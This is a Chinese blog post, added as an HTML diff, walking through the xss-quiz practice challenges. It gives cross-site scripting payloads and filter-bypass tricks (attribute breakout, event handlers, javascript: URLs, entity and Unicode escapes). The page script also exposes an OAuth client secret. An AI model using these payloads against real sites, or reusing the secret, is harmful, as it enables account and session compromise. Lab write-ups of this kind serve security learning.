@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            xss从零开始（二）之怒刷xss-quiz
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/08/02/xss从零开始（二）之怒刷xss-quiz/"> 
+                    xss从零开始（二）之怒刷xss-quiz 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-08-02   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#刷题"><span class="toc-list-text">刷题</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#chanllenge1"><span class="toc-list-text">chanllenge1</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge2"><span class="toc-list-text">challenge2</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge3-其它input框的xss"><span class="toc-list-text">challenge3 其它input框的xss</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge4-隐藏input框"><span class="toc-list-text">challenge4 隐藏input框</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge5-长度限制"><span class="toc-list-text">challenge5 长度限制</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge6-on事件bypass尖括号"><span class="toc-list-text">challenge6 on事件bypass尖括号</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge7-过滤尖括号和双引号和-amp"><span class="toc-list-text">challenge7 过滤尖括号和双引号和&amp;</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge8-javascript伪协议"><span class="toc-list-text">challenge8 javascript伪协议</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge9"><span class="toc-list-text">challenge9</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge10-过滤特定字符"><span class="toc-list-text">challenge10 过滤特定字符</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge11-编码绕过"><span class="toc-list-text">challenge11 编码绕过</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge12"><span class="toc-list-text">challenge12</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#challenge15-document-write"><span class="toc-list-text">challenge15 document.write()</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#总结"><span class="toc-list-text">总结</span></a></li></ol>
+</div>
+            <div class="content">
+                <h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p>话不多说，刷题，平台：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">xss-quiz</a></p>
+<h2 id="chanllenge1"><a href="#chanllenge1" class="headerlink" title="chanllenge1"></a>chanllenge1</h2><p>直接丢payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>document.domain 弹出当前网页的网址</p>
+<h2 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h2><p>随便查一个语句看一下浏览器是怎么渲染的<br><img src="https://s1.ax1x.com/2018/08/02/P02C5t.png" alt><br>查询的东西嵌在input标签里的value属性里，解析不到script标签不会调用Js，构造一下bypass逃逸input标签。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;value=&quot;12</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge3-其它input框的xss"><a href="#challenge3-其它input框的xss" class="headerlink" title="challenge3 其它input框的xss"></a>challenge3 其它input框的xss</h2><p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=1d3a326683f074388b7728dca060b78a14f0e9ec" target="_blank" rel="noopener">题目地址</a></p>
+<p>普通构造，右键源码发现把尖括号实体化编码了。<br><img src="https://s1.ax1x.com/2018/08/02/P02ebj.png" alt><br>用编码没绕过去，p2选择出存在xss无过滤，改一下参数为构造语句再提交<br><img src="https://s1.ax1x.com/2018/08/02/P02ZrQ.md.jpg" alt></p>
+<h2 id="challenge4-隐藏input框"><a href="#challenge4-隐藏input框" class="headerlink" title="challenge4 隐藏input框"></a>challenge4 隐藏input框</h2><p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=33be43b49a6aea5be5c026a7237d7b4f02c0ad5d" target="_blank" rel="noopener">题目地址</a></p>
+<p>隐藏有个p3输入框，type从hidden改为test，构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge5-长度限制"><a href="#challenge5-长度限制" class="headerlink" title="challenge5 长度限制"></a>challenge5 长度限制</h2><p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d4eb6de1a6a0e9bd47b5926e4f8565b2050c5bf1" target="_blank" rel="noopener">题目地址</a></p>
+<p>长度限制改一下就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge6-on事件bypass尖括号"><a href="#challenge6-on事件bypass尖括号" class="headerlink" title="challenge6 on事件bypass尖括号"></a>challenge6 on事件bypass尖括号</h2><p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=6509f715d2192b584b19d2b5e5bd1bc6717762fc" target="_blank" rel="noopener">题目地址</a></p>
+<p>过滤了尖括号，用其它事件绕过去，注意查看元素构造Payload:</p>
+<p>鼠标向上移动触发js事件：<code>&quot;onmouseover=&quot;alert(document.domain)&quot;</code>,onmouseover要脱离引号，alert在引号内。</p>
+<p>鼠标点击触发js事件：<code>&quot;onclick=&quot;alert(document.domain)&quot;</code></p>
+<p>事件会在页面或图像加载完成后立即发生:<code>onload=&quot;alert(document.domain)&quot;</code></p>
+<h2 id="challenge7-过滤尖括号和双引号和-amp"><a href="#challenge7-过滤尖括号和双引号和-amp" class="headerlink" title="challenge7 过滤尖括号和双引号和&amp;"></a>challenge7 过滤尖括号和双引号和&amp;</h2><p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=15c647c2238f650c9f950d9639a4df17c21005b8" target="_blank" rel="noopener">题目地址</a></p>
+<p>经测试，输入空格会自动把前面补一个双引号，然后自己多构造一下找规律就行<br>bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a onclick=alert(document.domain)</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge8-javascript伪协议"><a href="#challenge8-javascript伪协议" class="headerlink" title="challenge8 javascript伪协议"></a>challenge8 javascript伪协议</h2><p>从网上学习到：看到输出是在href属性下，用javascript伪协议</p>
+<p>常见用到伪协议的属性如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">href</span><br><span class="line">backgroud</span><br></pre></td></tr></table></figure>
+
+<p>学了一波javascript伪协议，看到离歌师傅有一篇文章写的javascript伪协议与url编码联合bypass的文章，感叹还有这种姿势，但是这个道题应该用不到编码，但是我尝试了一下javascript伪协议确实会把“符号”变为“字符串”，从而使用编码，具体看师傅的文章：<br><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">利用location来变形我们的XSS Payload</a></p>
+<p>bypass:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure>
+
+<p>等价的bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert%28document.domain%29;</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h2><p>utf-7编码，看到网上说有问题，直接跳过</p>
+<h2 id="challenge10-过滤特定字符"><a href="#challenge10-过滤特定字符" class="headerlink" title="challenge10 过滤特定字符"></a>challenge10 过滤特定字符</h2><p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=6fa5bf6c0c7288222210ed0d77f851739e00f7e5" target="_blank" rel="noopener">题目地址</a></p>
+<p>过滤了domain，构造出来domain</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;/script&gt;&quot;&lt;value=&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge11-编码绕过"><a href="#challenge11-编码绕过" class="headerlink" title="challenge11 编码绕过"></a>challenge11 编码绕过</h2><p>题目地址(<a href="http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff</a>)</p>
+<p>这题过滤很多：<br>1，script会被替换为xscript　</p>
+<p>2，on事件会被替换为onxxx</p>
+<p>3，style会被替换为stxxx</p>
+<p>想用html编码绕过构造script标签，结果如下：<br><img src="https://s1.ax1x.com/2018/08/03/PBNnnf.png" alt><br>后来测试发现，浏览器再解析xml时，先把标签解析成DOM树，而在标签名解析的时候不会解释html编码。解析成DOM树后，html编码解析只对<br>标签里面<strong>属性的值</strong>进行解码的。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>会被解析为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;script&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是脱离属性外的值不会被解码，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还是会被解析成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们构造script标签的思路行不通，那我们可以用html编码构造事件，但是构造事件又会脱离“属性”这个范围，编码不会被解析。那我们就重新构造标签，利用href属性和Javascript伪协议<br>bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="challenge12"><a href="#challenge12" class="headerlink" title="challenge12"></a>challenge12</h2><p>过滤了&lt;&gt;和双引号，绕不过去双引号闭合，我们用html编码构造的双引号会被认为成“字符串型”的引号，而不是“符号”，所以不能逃逸出来，看到网上wp说用`可以代替引号，前提是IE8浏览器才能这么解释，这里没什么实战意义，就不做了</p>
+<h2 id="challenge15-document-write"><a href="#challenge15-document-write" class="headerlink" title="challenge15 document.write()"></a>challenge15 document.write()</h2><p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=0e9fcc768b680fc1b76007d10e36ea7d68d79dfd" target="_blank" rel="noopener">题目地址</a></p>
+<p>这题过滤了尖括号，双引号，但在input标签之上引用了document.write的方法，那么什么是document.write方法呢？</p>
+<p>w3c里是这样定义的：<br>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
+<p>也就是说我们在write一下插入的代码就是js范畴了，\u + Unicode编码这种形式是js的编码方法，所以会被解释为&lt;，但是document.write在输出的时候会JavascriptDecode一下数据，会把数据原有\去除，即php里面的stripslashes。</p>
+<p>因此我们要用\来替代\，payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br><span class="line">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure>
+
+<p>一种是unicode编码，一种是\x + 16进制，都可以绕过</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>剩下的题目有些环境严苛不做研究。总结一下，能调用js的方式：一些on事件，如:onmouseover、onclick、onerror等等。或者script标签，如果是标签的话，要脱离其它标签才能开启js解析调用。还有就是一些特定的方法，现在接触到的只有一个document.write。</p>
+<p>学会构造、学会用javascript伪协议，学会编码绕过，知道浏览器解析的顺序，that’s important~</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2018/08/02/xss从零开始（二）之怒刷xss-quiz/">https://hpdoger.cn/2018/08/02/xss从零开始（二）之怒刷xss-quiz/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2018/08/06/xss从零开始（三）之怒刷google-xss/">  xss从零开始（三）之怒刷google-xss</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/08/01/xss从零开始（一）/"> xss从零开始（一） </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Thu Aug 02 2018 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
